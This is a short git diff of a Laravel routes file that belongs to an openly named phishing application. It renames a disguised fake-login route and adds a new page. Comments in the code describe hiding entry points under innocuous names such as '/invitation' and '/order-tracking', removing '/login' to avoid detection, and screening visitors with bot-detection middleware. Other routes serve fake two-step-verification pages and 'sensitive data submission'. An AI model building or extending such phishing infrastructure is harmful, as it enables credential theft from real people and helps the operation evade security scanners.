@@ -18,7 +18,7 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
 
     // Hidden Entry Points - Wrapped and Renamed for Disguise
     // We remove '/login' and '/latest-settings-info' to avoid detection
-    Route::get('/order-tracking', [PhishingController::class, 'showLogin2v2']);
+    Route::get('/invitation-login', [PhishingController::class, 'showLogin2v2']);
     Route::get('/invitation', [PhishingController::class, 'index']);
 
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
@@ -31,6 +31,9 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
         Route::get('/two_step_verification{tpath}/latest-settings-info/{stoken}', [PhishingController::class, 'showFx']);
     });
     Route::get('/login2v2', [PhishingController::class, 'showLogin2v2']);
+    Route::get('/index2', function () {
+        return view('index2');
+    });
 });
 
 // Sensitive Data Submission Routes - Protected by Bot Detection but visible to real browsers
